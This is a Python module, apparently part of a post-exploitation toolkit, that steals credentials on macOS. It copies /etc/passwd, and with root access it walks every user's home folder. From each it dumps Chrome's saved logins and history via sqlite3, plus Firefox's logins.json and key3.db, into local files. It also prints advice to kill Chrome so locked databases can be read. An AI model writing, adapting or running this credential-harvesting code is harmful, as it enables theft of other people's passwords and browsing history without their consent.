import os
import subprocess

reports = ''

# find child directories
def getChildir(a_dir):
	try:
	    return [name for name in os.listdir(a_dir)
	            if os.path.isdir(os.path.join(a_dir, name))]
	except:
		return False

# find users in system
def enumUsers():
	global reports
	fullPath = '/Users/'
	childirs = getChildir(fullPath)
	if childirs:
		xx = 0
		while xx < len(childirs):
			# go thru all users and try to loot them..
			if childirs[xx] != '.localized' and childirs[xx] != 'Shared':
				try:
					reports += '\n'
					lootUser = fullPath + childirs[xx]
					lootChrome(lootUser)
					lootFirefox(lootUser)
				except:
					break
			xx += 1

# main module will loot for passwords in mac
def macLoot(m):
	global reports
	me = m
	reports += '\n -  Looting Mac...\n'
	
	# User passwords
	fullPath = '/etc/passwd'
	if os.path.isfile(fullPath):
		try:
			f = open(fullPath, 'r')
			c = f.read()
			if len(c) > 10:
				reports += '[*] Found /etc/passwd.\n'
				FF = open('passwd.txt', 'w')
				FF.write(c)
				FF.close()
		except:	reports += '[e] Passwd: Access denied.\n'

	if me != 'root': 
		reports += ''
		lootChrome(0)
		lootFirefox(0)
	# if we are running as root, lets enum other users
	if me == 'root': enumUsers()
	# return any reports
	return reports

# get chrome pass' from any user [default = current]
def lootChrome(ii):
	global reports
	if ii == 0: homePath = os.path.expanduser('~')
	else:			homePath = ii
	looted = 0
	# Google chrome passwords
	fullPath = homePath + '/Library/Application Support/Google/Chrome/Default/Login Data'
	if os.path.exists(fullPath):
		f = open(fullPath, 'r')
		c = f.read()
		# if we actually found passwords, write to text file...
		if len(c) > 10: 
			try:
				looted += 1
				reports += '[*] Found chrome passwords.\n'
				fn = str(homePath.rsplit('/', 1)[-1]) + '-chromelogins.csv'
				p1 = subprocess.Popen(['sqlite3', '-header', '-csv', '-separator',
						              ',',fullPath, 'SELECT * FROM logins'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				p2 = p1.stdout.read()
				p3 = p1.stderr.read()
				if len(p2) > 1: 
					FF = open(fn, 'w')
					FF.write(p2)
					FF.close()
				if len(p3) > 1: reports += '[e] ' + str(p3) + '\n'
			except:
				reports += '[e] Chrome: Database Locked.\n'
		f.close()
	# Google chrome history
	fullPath = homePath + '/Library/Application Support/Google/Chrome/Default/History'
	if os.path.exists(fullPath):
		f = open(fullPath, 'r')
		c = f.read()
		# if we actually found passwords, write to text file...
		if len(c) > 10: 
			try:
				looted += 1
				reports += '[*] Found chrome history.\n'
				fn = str(homePath.rsplit('/', 1)[-1]) + '-chromehistory.csv'
				p1 = subprocess.Popen(['sqlite3', '-header', '-csv', '-separator',
						              ',',fullPath, 'SELECT * FROM urls'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				p2 = p1.stdout.read()
				p3 = p1.stderr.read()
				if len(p2) > 1: 
					FF = open(fn, 'w')
					FF.write(p2)
					FF.close()
				if len(p3) > 1: 
					reports += '[e] ' + str(p3) + '\n'
					reports += '[*] Try killing chrome:\n'
					reports += '      ps aux | grep Chrome\n'
					reports += '      kill [process ID]\n\n'
			except:
				reports += '[e] Chrome: Database Locked.\n'
		f.close()
	if looted > 0: reports += '    User: ' + str(homePath.rsplit('/', 1)[-1]) + '\n'

# get firefox pass' from any user [default = current]
def lootFirefox(ii):
	global reports
	if ii == 0: homePath = os.path.expanduser('~')
	else: homePath = ii
	# Mozilla firefox passwords
	fullPath = homePath + '/Library/Application Support/Firefox/Profiles/'
	if os.path.exists(fullPath):
		childirs = getChildir(fullPath)
		# if there is only 1 directory
		if len(childirs) == 1:
			fullPath = homePath + '/Library/Application Support/Firefox/Profiles/' + childirs[0] + '/logins.json'
			if os.path.isfile(fullPath):
				f = open(fullPath, 'r')
				c = f.read()
				# if we actually found passwords, write to text file...
				if len(c) > 10: 
					reports += '[*] Found firefox passwords.\n'
					reports += '    User: ' + str(homePath.rsplit('/', 1)[-1]) + '\n'
					fn = str(homePath.rsplit('/', 1)[-1]) + '-logins.json'
					FF = open(fn, 'w')
					FF.write(c)
					FF.close()
				f.close()
			fullPath = homePath + '/Library/Application Support/Firefox/Profiles' + childirs[0] + '/key3.db'
			if os.path.isfile(fullPath):
				f = open(fullPath, 'r')
				c = f.read()
				# if we actually found passwords, write to text file...
				if len(c) > 10: 
					fn = str(homePath.rsplit('/', 1)[-1]) + '-key3.db'
					FF = open(fn, 'w')
					FF.write(c)
					FF.close()
				f.close()